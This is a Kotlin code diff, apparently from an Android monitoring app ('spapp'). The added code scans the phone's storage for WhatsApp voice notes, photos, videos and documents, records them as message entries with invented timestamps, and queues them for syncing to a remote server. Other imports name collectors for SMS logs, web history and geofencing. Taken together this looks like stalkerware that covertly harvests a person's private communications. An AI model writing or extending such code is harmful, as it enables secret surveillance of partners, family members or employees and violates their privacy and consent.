@@ -14,6 +14,7 @@ import com.spapp.monitoring.collectors.SmsLogCollector
 import com.spapp.monitoring.collectors.WebHistoryCollector
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.data.local.AppDatabase
+import com.spapp.monitoring.data.local.WhatsAppMessageEntry
 import com.spapp.monitoring.filetransfer.FileTransferClient
 import com.spapp.monitoring.geofence.GeofenceManager
 import com.spapp.monitoring.network.AckCommandRequest
@@ -589,6 +590,55 @@ class SyncRunner(private val context: Context) {
     }
 
     private suspend fun syncWhatsAppMessages(bearer: String, db: AppDatabase) {
+        // If local room table has no messages, scan for WhatsApp media files on storage
+        try {
+            if (db.whatsAppMessageDao().count() == 0) {
+                val waFiles = FileManagerCollector(context).listWhatsAppFiles(50)
+                if (waFiles.isNotEmpty()) {
+                    val entries = mutableListOf<WhatsAppMessageEntry>()
+                    for (file in waFiles) {
+                        if (file.isDirectory) continue
+                        val lower = file.name.lowercase()
+                        val type = when {
+                            lower.endsWith(".opus") || lower.endsWith(".mp3") || lower.endsWith(".m4a") -> "audio"
+                            lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".png") || lower.endsWith(".webp") -> "image"
+                            lower.endsWith(".mp4") || lower.endsWith(".3gp") || lower.endsWith(".mkv") -> "video"
+                            lower.endsWith(".pdf") || lower.endsWith(".doc") || lower.endsWith(".docx") -> "document"
+                            else -> null
+                        }
+                        if (type != null) {
+                            val isOut = file.path.contains("Sent", ignoreCase = true)
+                            val chat = when {
+                                file.path.contains("Voice Notes", ignoreCase = true) -> "WhatsApp Audio"
+                                file.path.contains("Images", ignoreCase = true) -> "WhatsApp Photos"
+                                file.path.contains("Documents", ignoreCase = true) -> "WhatsApp Documents"
+                                file.path.contains("Video", ignoreCase = true) -> "WhatsApp Video"
+                                else -> "WhatsApp Media"
+                            }
+                            entries += WhatsAppMessageEntry(
+                                chatName = chat,
+                                sender = if (isOut) "Me" else chat,
+                                messageText = when (type) {
+                                    "audio" -> "🎤 Voice message"
+                                    "image" -> "📷 Photo"
+                                    "video" -> "🎥 Video"
+                                    "document" -> "📄 ${file.name}"
+                                    else -> file.name
+                                },
+                                isOutgoing = isOut,
+                                messageTimeEpochMs = System.currentTimeMillis() - 7200000,
+                                mediaType = type,
+                                mediaPath = file.path
+                            )
+                        }
+                    }
+                    if (entries.isNotEmpty()) {
+                        db.whatsAppMessageDao().insertAll(entries)
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+
         val unsynced = db.whatsAppMessageDao().getUnsynced()
         if (unsynced.isEmpty()) return
 
